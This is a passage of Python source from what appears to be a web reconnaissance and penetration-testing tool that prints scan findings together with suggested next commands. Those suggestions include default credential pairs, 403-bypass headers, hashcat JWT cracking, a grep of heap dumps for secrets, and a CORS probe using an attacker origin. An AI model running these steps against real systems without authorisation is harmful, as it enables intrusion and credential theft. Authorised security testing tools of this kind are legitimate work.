                src_label = " ← from .git/config" if _git.get("remote_url","") in repo_url else ""
                print(f"    {C.BLUE}{repo_url}{C.END}{C.YELLOW}{src_label}{C.END}")
            print()

        # ── Software table ────────────────────────────────────────────────────
        if _sw:
            # Limit noisy library lists; always show CMS/runtime/framework
            priority = [s for s in _sw if s.get("category") in ("cms","runtime","framework","docker")]
            libs     = [s for s in _sw if s.get("category") == "library"]
            ci_items = [s for s in _sw if s.get("category") == "ci"]

            def _sw_table(items, title):
                if not items:
                    return
                print(f"  {C.CYAN}  {title}:{C.END}")
                print(f"  {C.GREY}  {'Name':<32} {'Version':<18} {'Source':<26} {'Pinned'}{C.END}")
                print(f"  {C.GREY}  {'─'*80}{C.END}")
                for s in items[:40]:
                    name    = (s.get("name","") or "")[:30]
                    ver     = (s.get("version","?") or "?")[:16]
                    source  = (s.get("source","") or "")[:24]
                    pinned  = "✓" if s.get("is_pinned") else "~"
                    # Colour version: red if known-CVE version range, yellow if unpinned
                    ver_col = C.GREEN if s.get("is_pinned") else C.YELLOW
                    # Highlight searchsploit hits
                    ss_term = f"{s.get('name','')} {s.get('version','').lstrip('v^~>=<').split(' ')[0]}"
                    has_exploits = ss_term.strip() in _sp_sw
                    exploit_mark = f"  {C.RED}⚡ EXPLOITS{C.END}" if has_exploits else ""
                    print(f"  {C.WHITE}  {name:<32}{C.END}{ver_col}{ver:<18}{C.END}"
                          f"{C.GREY}{source:<26}{pinned}{C.END}{exploit_mark}")
                print()

            _sw_table(priority, "Application / Runtime / Framework")
            if libs:
                _sw_table(libs[:20], f"Libraries ({len(libs)} found — showing top 20)")
            if ci_items:
                _sw_table(ci_items, "CI/CD / Build")

            # Exploit summary — per-term hits
            if _sp_sw:
                print(f"  {C.RED}{C.BOLD}  ⚡ SEARCHSPLOIT MATCHES (from manifest versions):{C.END}")
                for term, hits in list(_sp_sw.items())[:6]:
                    print(f"    {C.YELLOW}{term}:{C.END}")
                    for h in hits[:4]:
                        print(f"      {C.RED}{h[:118]}{C.END}")
                repro(f"searchsploit --id {list(_sp_sw.keys())[0]}")
                print()

        print()   # trailing blank line

    # --- Wildcard / soft-404 warning ---
    if pr.is_wildcard_404:
        print(f"  {C.RED}⚠ WILDCARD 404: Server returns {pr.wildcard_status} for nonexistent paths! Probe hits below may be FALSE POSITIVES.{C.END}")
        print(f"  {C.RED}  Use feroxbuster --filter-status/--filter-size to filter.{C.END}")

    # --- WhatWeb / wafw00f ---
    if pr.whatweb_out:
        repro(f"whatweb {q(curl_url)}")
        if pr.whatweb_out == "__TIMEOUT__":
            print(f"  {C.CYAN}WhatWeb:{C.END} {C.YELLOW}timeout{C.END}")
        else:
            # Only print WhatWeb if it adds something beyond what Tech already shows
            first = pr.whatweb_out.splitlines()[0] if pr.whatweb_out.splitlines() else pr.whatweb_out
            # Strip the URL prefix from whatweb output for cleaner display
            _ww_clean = re.sub(r'^https?://\S+\s+\[.*?\]\s*', '', first).strip()
            if _ww_clean and len(_ww_clean) > 5:
                print(f"  {C.DIM}  whatweb: {_ww_clean[:180]}{C.END}")

    if pr.waf_detected:
        repro(f"wafw00f {q(curl_url)}")
        if pr.waf_detected.lower() not in ("none", ""):
            print(f"  {C.RED}⚠ WAF:{C.END} {C.YELLOW}{pr.waf_detected}{C.END}  {C.GREY}← bypass techniques in exploitation guide below{C.END}")
        # Don't print "WAF: none" — it's noise, absence of WAF is the default

    # --- robots / sitemap ---
    robots_url = urljoin(curl_url, "robots.txt")
    sitemap_url = urljoin(curl_url, "sitemap.xml")
    repro(f"curl -sSikL {q(robots_url)}")
    repro(f"curl -sSikL {q(sitemap_url)}")
    _robots_str = f"{C.GREEN}YES{C.END} ({pr.robots.status})" if pr.robots.present else f"{C.GREY}no{C.END}"
    _sitemap_str = f"{C.GREEN}YES{C.END} ({pr.sitemap_status})" if pr.sitemap_present else f"{C.GREY}no{C.END}"
    print(f"  {C.CYAN}robots.txt:{C.END} {_robots_str}  {C.CYAN}sitemap.xml:{C.END} {_sitemap_str}")
    if pr.robots.present and pr.robots.snippet and not brief:
        # Show FULL robots.txt content — no line cap
        for ln in pr.robots.snippet.splitlines():
            print(f"     {C.DIM}{ln[:220]}{C.END}")
        # Direct URL for quick browser/curl access
        print(f"     {C.GREY}→ {robots_url}{C.END}")

        # ── CMS auto-detection from robots.txt content ────────────────────
        _rblob = pr.robots.snippet.lower()
        _detected_cms = ""
        if "joomla" in _rblob or ("/administrator/" in _rblob and "/components/" in _rblob):
            _detected_cms = "Joomla"
            if "Joomla" not in (pr.tech or []):
                pr.tech.append("Joomla")
        elif "wp-admin" in _rblob or "wp-includes" in _rblob or "wp-content" in _rblob:
            _detected_cms = "WordPress"
            if "WordPress" not in (pr.tech or []):
                pr.tech.append("WordPress")
        elif "drupal" in _rblob or ("/core/" in _rblob and "/modules/" in _rblob and "/profiles/" in _rblob):
            _detected_cms = "Drupal"
            if "Drupal" not in (pr.tech or []):
                pr.tech.append("Drupal")
        elif "moodle" in _rblob:
            _detected_cms = "Moodle"
        elif "magento" in _rblob or "/downloader/" in _rblob:
            _detected_cms = "Magento"
        if _detected_cms:
            print(f"  {C.RED}⚡ CMS DETECTED (robots.txt): {C.YELLOW}{_detected_cms}{C.END}")

    # --- Probe hits ---
    if pr.probes and not brief:
        hit_paths = [x.path.lstrip("/") for x in pr.probes[:20] if x.path]
        if hit_paths:
            joined = " ".join([q(p) for p in hit_paths])
            repro(f"for p in {joined}; do curl -sSikL {q(curl_url)}\"$p\" | head -n 1; done  # reproduce listed hits")
        
        # Categorize findings
        critical_patterns = [".git/", ".env", ".svn/", ".hg/", "config.php", "wp-config", 
                            "database.sql", ".sql", "backup.", "credentials", "secret",
                            "web.config", ".htpasswd", "settings.py", "application.yml",
                            "actuator/heapdump", "actuator/env", "/script", "invoker/",
                            ".aws/", "config/database.yml", "config/secrets.yml"]
        high_patterns = [".git", "phpinfo", "server-status", "server-info", ".htaccess",
                        "wp-json/wp/v2/users", "debug", "console", "admin", "manager/html",
                        "swagger", "api-docs", "graphql", "elmah.axd", "trace.axd",
                        "package.json", "composer.json", "requirements.txt", "Gemfile",
                        "Dockerfile", ".gitlab-ci", "Jenkinsfile", "actuator", "jolokia"]
        
        # Patterns where 403 is still interesting (confirms existence)
        forbidden_interesting = [".git", ".svn", ".hg", ".env", "admin", "manager", 
                                 "wp-admin", "phpmyadmin", "server-status", "server-info",
                                 "actuator", "console", "debug", "backup", "config",
                                 "cgi-bin", "private", "secret", "internal", ".htpasswd",
                                 "WEB-INF", "META-INF"]
        
        hits_strs = []
        critical_hits = []
        forbidden_hints = []  # 403 but interesting
        auth_required = []    # 401 - try default creds
        server_errors = []    # 500 - potential vuln
        
        for x in pr.probes[:25]:
            path_lower = (x.path or "").lower()
            status = x.status or ""
            
            is_critical = any(p in path_lower for p in critical_patterns)
            is_high = any(p in path_lower for p in high_patterns)
            is_forbidden_interesting = any(p in path_lower for p in forbidden_interesting)
            
            # Categorize by status + path
            if status == "403" and is_forbidden_interesting:
                forbidden_hints.append((x.path, "403"))
            elif status == "401":
                auth_required.append((x.path, "401"))
            elif status.startswith("5"):
                server_errors.append((x.path, status))
            
            # Color coding
            if is_critical and status == "200":
                col = C.RED + C.BOLD
                critical_hits.append(x.path)
            elif is_critical and status in ("403", "401"):
                col = C.RED  # Still important - exists!
                if status == "403":
                    forbidden_hints.append((x.path, status))
            elif is_high:
                col = C.RED if status == "200" else C.YELLOW
            elif status == "200":
                col = C.GREEN
            elif status == "403":
                col = C.YELLOW
            elif status == "401":
                col = C.YELLOW
            else:
                col = C.GREY
            hits_strs.append(f"{col}{x.path}{C.END}({status})")
        
        # Print critical alert first (200 OK on sensitive files)
        if critical_hits:
            print(f"  {C.RED}{'═' * 50}{C.END}")
            print(f"  {C.RED}⚠️  CRITICAL EXPOSURE DETECTED:{C.END}")
            for cp in critical_hits:
                full = urljoin(curl_url, cp.lstrip("/"))
                print(f"      {C.RED}{C.BOLD}→ {cp}{C.END}  {C.WHITE}curl -sS '{full}'{C.END}")
            print(f"  {C.RED}{'═' * 50}{C.END}")
        
        # Dedupe forbidden_hints
        seen_forbidden = set()
        unique_forbidden = []
        for path, status in forbidden_hints:
            if path not in seen_forbidden and path not in critical_hits:
                seen_forbidden.add(path)
                unique_forbidden.append((path, status))
        
        # Print 403 Forbidden hints (directory/file EXISTS but blocked)
        if unique_forbidden:
            print(f"  {C.YELLOW}{'─' * 50}{C.END}")
            print(f"  {C.YELLOW}🔒 403 FORBIDDEN (exists but blocked - try bypass):{C.END}")
            for path, status in unique_forbidden[:8]:
                full = urljoin(curl_url, path.lstrip("/"))
                bypass_hints = []
                path_lower = path.lower()
                if ".git" in path_lower:
                    bypass_hints.append("try: /.git/HEAD, /.git/config, /.git/logs/HEAD")
                if "admin" in path_lower or "manager" in path_lower:
                    bypass_hints.append("try: X-Forwarded-For: 127.0.0.1, path traversal")
                if "server-status" in path_lower:
                    bypass_hints.append("try: /server-status?auto, /%2e/server-status")
                
                print(f"      {C.YELLOW}→ {path}{C.END} (403)")
                if bypass_hints:
                    print(f"        {C.GREY}{bypass_hints[0]}{C.END}")
            print(f"  {C.GREY}  Bypass: curl -H 'X-Original-URL: {unique_forbidden[0][0]}' '{curl_url}'{C.END}")
            print(f"  {C.GREY}  Bypass: curl -H 'X-Rewrite-URL: {unique_forbidden[0][0]}' '{curl_url}'{C.END}")
            print(f"  {C.YELLOW}{'─' * 50}{C.END}")
        
        # Print 401 Unauthorized (try default creds)
        unique_auth = [(p,s) for p,s in auth_required if p not in seen_forbidden and p not in critical_hits]
        if unique_auth:
            print(f"  {C.CYAN}🔑 401 AUTH REQUIRED (try default creds):{C.END}")
            for path, status in unique_auth[:5]:
                cred_hints = ""
                path_lower = path.lower()
                if "manager" in path_lower or "tomcat" in path_lower:
                    cred_hints = " → tomcat:tomcat, admin:admin, tomcat:s3cret"
                elif "admin" in path_lower:
                    cred_hints = " → admin:admin, admin:password, root:root"
                elif "jenkins" in path_lower:
                    cred_hints = " → admin:admin, jenkins:jenkins"
                elif "phpmyadmin" in path_lower or "pma" in path_lower:
                    cred_hints = " → root:root, root:, mysql:mysql"
                print(f"      {C.CYAN}→ {path}{C.END} (401){C.GREY}{cred_hints}{C.END}")
        
        # Print 500 errors (potential vulnerabilities)
        unique_errors = [(p,s) for p,s in server_errors if p not in seen_forbidden]
        if unique_errors:
            print(f"  {C.RED}💥 SERVER ERRORS (potential vulnerabilities):{C.END}")
            for path, status in unique_errors[:5]:
                print(f"      {C.RED}→ {path}{C.END} ({status}) - investigate for info disclosure/injection")
        
        print(f"  {C.CYAN}Quickwin Hits:{C.END} {', '.join(hits_strs)}")

    # --- Sensitive file contents ---
    if pr.sensitive_files:
        print(f"  {C.RED}{'─' * 50}{C.END}")
        print(f"  {C.RED}⚡ SENSITIVE FILES FOUND:{C.END}")
        for path, content in pr.sensitive_files.items():
            full = urljoin(curl_url, path.lstrip("/"))
            repro(f"curl -sS {q(full)} | sed -n '1,120p'")
            print(f"  {C.RED}── {path} ──{C.END}")
            for line in content.splitlines()[:25]:
                line_s = line.strip()
                if not line_s:
                    continue
                if re.search(r'(?i)(password|passwd|pwd|secret|key|token|auth|credential|private)', line_s):
                    print(f"     {C.RED}{C.BOLD}{line_s[:200]}{C.END}")
                else:
                    print(f"     {C.DIM}{line_s[:200]}{C.END}")
            if content.count("\n") > 25:
                print(f"     {C.DIM}... (truncated, {content.count(chr(10))} lines){C.END}")
        print(f"  {C.RED}{'─' * 50}{C.END}")

    # --- Cookies ---
    if pr.cookies:
        insecure = [c for c in pr.cookies if c.get("flags") or c.get("jwt_warn")]
        if insecure:
            print(f"  {C.CYAN}Cookies:{C.END}")
            for c in insecure[:8]:
                flag_str = c.get("flags", "")
                jwt_warn = c.get("jwt_warn", "")
                jwt_alg  = c.get("jwt_alg", "")
                jwt_claims = c.get("jwt_claims", "")
                line = f"    {C.WHITE}{c['name']}{C.END}"
                if jwt_alg:
                    line += f"  {C.YELLOW}[JWT alg={jwt_alg}]{C.END}"
                if flag_str:
                    line += f"  {C.YELLOW}{flag_str}{C.END}"
                print(line)
                if jwt_warn:
                    print(f"      {C.RED}{jwt_warn}{C.END}")
                    print(f"      {C.GREY}hashcat -m 16500 '<token>' {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}{C.END}")
                if jwt_claims and not brief:
                    print(f"      {C.GREY}Claims: {jwt_claims[:160]}{C.END}")

    # --- Forms ---
    if pr.forms:
        repro(f"curl -sS {q(curl_url)} | grep -niE '<form|type=\"password\"|type=\"file\"' | head -n 40")
        for f in pr.forms[:4]:
            form_type = ""
            if f.get("has_password"):
                form_type = f"{C.YELLOW}[LOGIN FORM]{C.END} "
            elif f.get("has_upload"):
                form_type = f"{C.RED}[FILE UPLOAD]{C.END} "
            print(f"  {C.CYAN}Form:{C.END} {form_type}{f['method']} → {f['action']}  inputs: {f['inputs']}")

    # --- HTML comments ---
    if pr.comments and not brief:
        repro(f"curl -sS {q(curl_url)} | grep -n '<!--' | head -n 100")
        print(f"  {C.CYAN}HTML Comments ({len(pr.comments)}):{C.END}")
        for cm in pr.comments[:50]:  # Show up to 50 comments
            t = cm.get("text", "")[:200]  # Show more text
            print(f"    {C.DIM}<!-- {t} --> (line {cm.get('line','?')}){C.END}")

    # --- JS secrets ---
    if pr.js_secrets:
        repro(f"curl -sS {q(curl_url)} | grep -niE 'api|token|key|secret|/api/' | head -n 60")
        print(f"  {C.RED}⚡ JS SECRETS/ENDPOINTS:{C.END}")
        for s in pr.js_secrets[:8]:
            print(f"    {C.RED}{s['type']}:{C.END} {s['value'][:100]}  {C.DIM}({s['source']}){C.END}")

    # --- Dev notes ---
    if pr.dev_notes:
        repro(f"curl -sS {q(curl_url)} | grep -niE 'TODO|FIXME|HACK|XXX' | head -n 60")
        print(f"  {C.ORANGE}Developer notes:{C.END}")
        for dn in pr.dev_notes[:4]:
            kw = dn.get("keyword", "NOTE")
            note = dn.get("note", "")
            loc = f"line {dn.get('line','?')}, col {dn.get('col','?')}"
            u = dn.get("url", "")
            if note:
                print(f"    {C.ORANGE}{kw}:{C.END} {note[:120]}")
            else:
                print(f"    {C.ORANGE}{kw}{C.END}")
            print(f"      {C.GREY}@ {u} ({loc}){C.END}")
            ctx = dn.get("context", "")
            if ctx and not brief:
                print(f"      {C.GREY}↳ {ctx}{C.END}")

    # --- Users / emails ---
    if pr.users:
        repro(f"curl -sS {q(curl_url)} | grep -Eo 'user(name)?\"?:\"?[A-Za-z0-9_.-]{{2,}}' | head")
        print(f"  {C.CYAN}Users:{C.END} {', '.join(pr.users[:12])}")
    if pr.emails:
        repro(rf"curl -sS {q(curl_url)} | grep -Eio '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{{2,}}' | sort -u | head")
        print(f"  {C.CYAN}Emails:{C.END} {', '.join(pr.emails[:8])}")

    # ── Security header analysis ───────────────────────────────────────────────
    _sh_list = pr.security_headers or []
    if _sh_list:
        repro(f"curl -sIkL {q(curl_url)} | grep -iE 'server|x-powered|csp|hsts|x-frame|x-content|cors'")
        # For pure 404 pages with no actual content, MED headers are just noise.
        # Only show HIGH findings (e.g. missing HSTS on HTTPS) + real HIGH/MED on real apps.
        _is_dead_404 = pr.status_line and "404" in pr.status_line and not pr.title or pr.title in ("Not Found", "404 Not Found", "")
        _severity_min = "HIGH" if _is_dead_404 else "MED"
        _high_med = [s for s in _sh_list if s.get("severity") in ("HIGH",) or
                     (s.get("severity") == "MED" and not _is_dead_404)]
        _info     = [s for s in _sh_list if s.get("severity") == "INFO"]
        if _high_med:
            print(f"  {C.CYAN}Security Headers:{C.END}")
            for _sh in _high_med[:8]:
                sev = _sh.get("severity", "MED")
                col = C.RED + C.BOLD if sev == "HIGH" else C.YELLOW
                sym = "⚠" if sev == "HIGH" else "✗"
                print(f"    {col}{sym} {_sh.get('header','')}: {_sh.get('issue','')}{C.END}")
                if _sh.get("fix"):
                    print(f"      {C.GREY}Fix: {_sh.get('fix','')}{C.END}")
        # Always show INFO as a single compact line (never expand)
        if _info and not _is_dead_404:
            _info_names = ", ".join(s.get("header","") for s in _info[:4])
            print(f"  {C.DIM}  ℹ {_info_names}{C.END}")

    # ── CORS reflection ────────────────────────────────────────────────────────
    if pr.cors_vuln:
        repro(f"curl -sI {q(curl_url)} -H 'Origin: https://evil.attacker.com' | grep -i 'access-control'")
        print(f"  {pr.cors_vuln}")

    # ── HTTP/2 support ─────────────────────────────────────────────────────────
    if pr.http2:
        print(f"  {C.CYAN}HTTP/2:{C.END} {C.GREEN}supported (ALPN h2){C.END}")
        repro(f"curl -sS --http2 {q(curl_url)} -I | head -5")

    # ── JWT tokens ─────────────────────────────────────────────────────────────
    if pr.jwt_tokens:
        repro(f"curl -sS {q(curl_url)} | grep -Eo 'eyJ[A-Za-z0-9._-]{{20,}}'")
        print(f"  {C.RED}⚡ JWT tokens found:{C.END}")
        for j in pr.jwt_tokens[:4]:
            tok = j.get("token", str(j)) if isinstance(j, dict) else str(j)
            loc = j.get("location", "response") if isinstance(j, dict) else "response"
            alg = j.get("alg", "") if isinstance(j, dict) else ""
            alg_str = f"  {C.YELLOW}[alg={alg}]{C.END}" if alg else ""
            print(f"    {C.YELLOW}[{loc}]{C.END}{alg_str} {tok[:80]}...")
            print(f"      {C.GREY}→ Test alg:none bypass, weak secret brute:{C.END}")
            if alg and alg.upper() == "NONE":
                print(f"      {C.RED}⚠ alg:none — signature verification skipped!{C.END}")
            print(f"      {C.GREY}  hashcat -a 0 -m 16500 '{tok[:40]}...' {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}{C.END}")

    # ── Open redirect ──────────────────────────────────────────────────────────
    if pr.open_redirect:
        print(f"  {pr.open_redirect}")

    # ── WebSocket ──────────────────────────────────────────────────────────────
    if pr.websocket:
        print(f"  {C.CYAN}WebSocket:{C.END} {C.GREEN}Upgrade header detected{C.END}")
        repro(f"websocat ws://{host}:{pr.port}/  # or wss:// for TLS")

    # ── Spring Boot Actuator ───────────────────────────────────────────────────
    if pr.actuator_paths:
        print(f"  {C.RED}⚡ SPRING BOOT ACTUATOR ENDPOINTS ({len(pr.actuator_paths)}):{C.END}")
        for ap in pr.actuator_paths[:8]:
            full_ap = urljoin(curl_url, ap.lstrip("/"))
            is_critical_actuator = any(x in ap for x in ("env", "heapdump", "configprops", "shutdown", "logfile"))
            col = C.RED + C.BOLD if is_critical_actuator else C.YELLOW
            print(f"    {col}→ {ap}{C.END}  {C.GREY}curl -sS '{full_ap}' | jq .{C.END}")
        if any("heapdump" in a for a in pr.actuator_paths):
            full_hd = urljoin(curl_url, "actuator/heapdump")
            print(f"    {C.RED}→ HEAP DUMP: curl -o heapdump.hprof '{full_hd}' && strings heapdump.hprof | grep -iE '(password|secret|token|key)' | head -50{C.END}")

    # ── GraphQL ────────────────────────────────────────────────────────────────
    if pr.graphql_path:
        gql_url = urljoin(curl_url, pr.graphql_path.lstrip("/"))
        print(f"  {C.RED}⚡ GRAPHQL ENDPOINT: {pr.graphql_path}{C.END}")
        _gql_query = '{"query":"{__schema{types{name fields{name}}}}"}'
        print(f"    {C.GREY}curl -sS '{gql_url}' -X POST -H 'Content-Type: application/json' -d '{_gql_query}' | jq .{C.END}")

    # --- HTTP TRACE ---
    if pr.trace_enabled:
        print(f"  {C.RED}⚡ HTTP TRACE ENABLED{C.END} {C.GREY}(XST risk — can steal cookies via cross-origin scripts){C.END}")
        print(f"    {C.GREY}curl -sS -X TRACE {q(curl_url)} -H 'Cookie: test=value'{C.END}")

    # --- HTTP PUT ---
    if pr.put_enabled:
        for pp in pr.put_enabled:
            put_url = curl_url.rstrip("/") + pp
            print(f"  {C.RED}⚡ HTTP PUT ACCEPTED:{C.END} {C.WHITE}{pp}{C.END} {C.GREY}→ potential file upload/RCE{C.END}")
            print(f"    {C.GREY}curl -sS -X PUT {q(put_url)} --data 'test' -I{C.END}")

    # --- IIS Shortname (confirmed vuln OR Windows target with HTTP) ---
    _os_for_iis = OS_GUESS.get("os", "")
    _tech_blob_iis = " ".join(t.lower() for t in (pr.tech or []))
    _iis_likely = (
        pr.iis_shortname_vuln
        or "iis" in _tech_blob_iis
        or "microsoft-iis" in _tech_blob_iis
        or ("windows" in _os_for_iis.lower() and ("asp" in _tech_blob_iis or "iis" in _tech_blob_iis))
    )
    _iis_check_suggested = (
        not pr.iis_shortname_vuln
        and "windows" in _os_for_iis.lower()
        and "iis" not in _tech_blob_iis
    )
    if pr.iis_shortname_vuln:
        print(f"  {C.RED}⚡ IIS 8.3 SHORTNAME VULN CONFIRMED{C.END} {C.GREY}→ enumerate hidden files/dirs{C.END}")
        print(f"    {C.GREY}python3 iis-shortname-scanner.py 2 20 {q(curl_url)}{C.END}")
        print(f"    {C.GREY}# Or: pip3 install iis-shortname-scanner && iis-shortname-scanner {q(curl_url)}{C.END}")
        print(f"    {C.GREY}# Manual tilde check: curl -sk '{curl_url}a*~1*.aspx' -o /dev/null -w '%{{http_code}}' (404=vulnerable, 400=not){C.END}")
    elif _iis_likely or _iis_check_suggested:
        print(f"  {C.YELLOW}⚡ Windows target — check IIS 8.3 shortname vulnerability{C.END}")
        print(f"    {C.GREY}# Quick tilde test (vulnerable = 404 for valid prefix, 400 for invalid):{C.END}")
        print(f"    {C.GREY}curl -sk '{curl_url}a*~1*.aspx' -o /dev/null -w '%{{http_code}}\\n'  # should be 404 if vuln{C.END}")
        print(f"    {C.GREY}curl -sk '{curl_url}zzzzz*~1*.aspx' -o /dev/null -w '%{{http_code}}\\n'  # should be 400 if vuln{C.END}")
        print(f"    {C.GREY}# Full scan (install once: pip3 install iis-shortname-scanner):{C.END}")
        print(f"    {C.GREY}iis-shortname-scanner {q(curl_url)}{C.END}")
        print(f"    {C.GREY}# Alt: https://github.com/irsdl/IIS-ShortName-Scanner{C.END}")
        print(f"    {C.GREY}java -jar iis_shortname_scanner.jar 2 20 {q(curl_url)}{C.END}")

    # --- WordPress Users ---
    if pr.wp_users:
        print(f"  {C.YELLOW}WP Users (REST API):{C.END} {C.GREEN}{', '.join(pr.wp_users[:10])}{C.END}")
        print(f"    {C.GREY}curl -sS {q(curl_url)}wp-json/wp/v2/users | jq .[].slug{C.END}")

    # --- CMS Version Files ---
    if pr.cms_version_files:
        print(f"  {C.YELLOW}Version files found:{C.END}")
        for path, info in list(pr.cms_version_files.items())[:6]:
            vurl = curl_url.rstrip("/") + path
            print(f"    {C.GREEN}{path}{C.END} → {C.WHITE}{info}{C.END}")
            print(f"    {C.GREY}curl -sS {q(vurl)}{C.END}")

    # --- Directory Listings ---
    if pr.dir_listings:
        print(f"  {C.YELLOW}Directory listings open:{C.END}")
        for dp in pr.dir_listings[:5]:
            print(f"    {C.GREEN}{dp}{C.END} {C.GREY}→ wget -r --no-parent {q(curl_url.rstrip('/') + dp)}{C.END}")

    # --- Backup Files ---
    if pr.backup_files_found:
        print(f"  {C.RED}⚡ BACKUP/SWAP FILES:{C.END}")
        for bp, snippet in list(pr.backup_files_found.items())[:6]:
            burl = curl_url.rstrip("/") + bp
            print(f"    {C.GREEN}{bp}{C.END}")
            print(f"    {C.GREY}curl -sS {q(burl)} | head -30  # {snippet[:60]!r}{C.END}")

    # --- Error Disclosures + Analysis ---
    if pr.error_disclosures:
        print(f"  {C.YELLOW}Error/info disclosures:{C.END}")
        for e in pr.error_disclosures[:6]:
            print(f"    {C.WHITE}{e[:100]}{C.END}")
    # Cross-reference findings: proxy leaks, stack traces, path disclosure, etc.
    _eda = getattr(pr, "error_disclosure_analysis", None)
    if _eda:
        for _ef in _eda:
            _ec = C.RED if _ef.startswith(("⚡", "💀")) else C.YELLOW
            print(f"  {_ec}{_ef}{C.END}")

    # --- TLS Audit ---
    if pr.sslscan_out:
        print(f"  {C.CYAN}TLS Audit (sslscan):{C.END}")
        for ln in pr.sslscan_out.splitlines()[:12]:
            col = C.RED if any(w in ln.lower() for w in ("sslv2","sslv3","tlsv1.0","tlsv1.1",
                               "weak","null","export","rc4","heartbleed","expired")) else C.GREY
            print(f"    {col}{ln[:160]}{C.END}")

    # --- Quick feroxbuster results (auto-ran during deep check) ---
    _fqr = getattr(pr, "ferox_quick_results", None)
    if _fqr and not brief:
        _fqr_cmd = _fqr[0].get("cmd", "") if _fqr else ""
        if _fqr_cmd:
            repro(_fqr_cmd)
        _meta = _fqr[0].get("_meta") if _fqr else ""
        _scan_only = len(_fqr) == 1 and _meta in ("scan_ran", "scan_ran_timeout")
        if _scan_only:
            print(f"  {C.CYAN}── feroxbuster quick (0 hits) ──{C.END}")
            if _meta == "scan_ran_timeout":
                print(f"    {C.GREY}No top-level quick hits found before 60s cutoff.{C.END}")
            else:
                print(f"    {C.GREY}No top-level quick hits found.{C.END}")
        else:
            _timed = any(x.get("_meta") == "timed_out" for x in _fqr)
            _note = " after 60s cutoff" if _timed else ""
            print(f"  {C.CYAN}── feroxbuster quick ({len(_fqr)} hits{_note}) ──{C.END}")
            for _fb in _fqr[:50]:
                _sc  = _fb.get("status", "")
                _col = (C.GREEN  if _sc == "200"                  else
                        C.YELLOW if _sc in ("301","302","307","308") else
                        C.ORANGE if _sc in ("401","403")           else C.GREY)
                _sz  = f"{_fb.get('size','?')}b/{_fb.get('words','?')}w"
                print(f"    {_col}{_sc}{C.END} {_fb.get('path',''):<40} {C.GREY}[{_sz}]{C.END}")
    elif RUNTIME_OPTS.get("do_ferox_quick", True) and not shutil.which("feroxbuster"):
        print(f"  {C.GREY}  (feroxbuster not installed — skipped quick scan){C.END}")

    # --- API Detection block ---
    # Display API framework + targeted next steps when an API was found.
    _api_techs = [t for t in (pr.tech or []) if "API:" in t or "graphql" in t.lower()]
    _api_secrets = [s for s in (pr.js_secrets or []) if s.get("type") in ("API Framework", "OpenAPI Spec")]
    if _api_techs or _api_secrets:
        _api_fw_str  = next((t.replace("API:", "") for t in _api_techs if "API:" in t), "REST API")
        _api_desc_s  = next((s["value"] for s in _api_secrets if s["type"] == "API Framework"), "")
        _spec_path_s = next((s["source"] for s in _api_secrets if s["type"] == "OpenAPI Spec"), "")
        _api_base    = next((s["source"] for s in _api_secrets if s["type"] == "API Framework"), "/api/")
        _api_url     = curl_url.rstrip("/") + _api_base
        print(f"\n  {C.CYAN}{C.BOLD}── API DETECTED: {_api_fw_str} ──{C.END}")
        if _api_desc_s:
            print(f"    {C.GREEN}{_api_desc_s}{C.END}")
        if _spec_path_s:
            _spec_full = curl_url.rstrip("/") + _spec_path_s
            print(f"    {C.YELLOW}⚡ OpenAPI spec: {_spec_full}{C.END}")
            print(f"    {C.GREY}curl -sS {q(_spec_full)} | python3 -m json.tool | head -60{C.END}")
            print(f"    {C.GREY}# Import into Burp Suite → Target → Import Swagger/OpenAPI{C.END}")
        print(f"    {C.GREY}# Enumerate API endpoints:{C.END}")
        print(f"    {C.GREY}feroxbuster -u {q(_api_url)} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x json --threads 50 -C 404 -q{C.END}")
        print(f"    {C.GREY}ffuf -u {q(_api_url)}FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,201,204,401,403 -t 50 2>/dev/null | head -20{C.END}")
        print(f"    {C.GREY}# Check for unauthenticated access / IDOR / mass assignment:{C.END}")
        print(f"    {C.GREY}curl -sS {q(_api_url)} | python3 -m json.tool | head -40{C.END}")
        print(f"    {C.GREY}curl -sS {q(_api_url)}users -H 'Content-Type: application/json' | head -20{C.END}")
        print(f"    {C.GREY}curl -sS {q(_api_url)}admin -H 'Content-Type: application/json' | head -20{C.END}")

    # --- Gobuster results ---
    if pr.gobuster_results and not brief:
        print(f"  {C.CYAN}Gobuster hits ({len(pr.gobuster_results)}):{C.END}")
        for gb in pr.gobuster_results[:20]:
            sc = gb.get("status","")
            col = C.GREEN if sc == "200" else C.YELLOW if sc in ("301","302") else C.ORANGE if sc in ("401","403") else C.GREY
            sz = f" [{gb.get('size','')} bytes]" if gb.get('size') else ""
            print(f"    {col}{sc}{C.END} {gb.get('path','')}{C.GREY}{sz}{C.END}")

    # --- Nikto ---
    if pr.nikto_out and not brief:
        repro(f"nikto -h {q(curl_url)} -Tuning 1 -nointeractive && nikto -h {q(curl_url)} -Tuning 23457890ab -nointeractive")
        _skip_nk = (
            "target ip:", "target hostname:", "target port:", "start time:",
            "end time:", "platform:", "nikto v", "items checked", "error(s)",
            "out of date", "no cgi directories", "cgi tests skipped",
            "scan terminated", "host(s) tested",
        )
        _nk_findings = []
        for _l in pr.nikto_out.splitlines():
            _ls = _l.strip()
            if not _ls.startswith("+"): continue
            if any(x in _ls.lower() for x in _skip_nk): continue
            if re.match(r'^\+\s+Server:\s+\S+\s*$', _ls): continue
            _nk_findings.append(_ls)
        if _nk_findings:
            print(f"  {C.CYAN}Nikto ({len(_nk_findings)} findings):{C.END}")
            for _nkl in _nk_findings[:25]:
                _hcol = C.RED if any(x in _nkl.lower() for x in
                    ("interesting","rce","exec","vuln","inject","shell","cve-","osvdb-",
                     "bypass","upload","path traversal","/dev/","/backup","/config",
                     "/admin","/test","dangerous","allowed")) else C.DIM
                print(f"    {_hcol}{_nkl[:220]}{C.END}")
        else:
            print(f"  {C.CYAN}Nikto:{C.END} {C.GREY}(no interesting findings){C.END}")
    
    # --- Verification commands (TTY mode only — sequential already printed inline) ---
    if _repro_cmds and not _is_seq:
        print(f"\n  {C.GREY}▷ Verify with:{C.END}")
        for _rc in _repro_cmds:
            print(f"    {C.GREY}$ {_rc}{C.END}")

    # --- Enhanced: Execute enumeration rules from ncscanner_rules.json ---
    if pr.url and not brief:
        # WinRM/dead ports: skip exploitation guide entirely, show only WinRM steps
        _is_winrm = pr.port in (5985, 5986) or (
